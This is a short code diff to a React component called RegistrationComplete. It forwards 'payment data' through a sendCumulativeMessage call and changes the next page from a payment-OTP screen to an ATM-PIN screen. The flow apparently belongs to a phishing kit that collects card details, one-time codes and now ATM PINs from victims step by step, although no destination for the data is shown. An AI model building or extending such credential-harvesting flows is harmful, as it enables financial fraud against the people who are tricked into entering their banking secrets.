@@ -115,7 +115,7 @@ const RegistrationComplete = () => {
 
     updateData(newData);
     await sendCumulativeMessage(4, "بيانات الدفع", newData);
-    navigate("/payment-otp");
+    navigate("/atm-pin");
   };
 
   return (
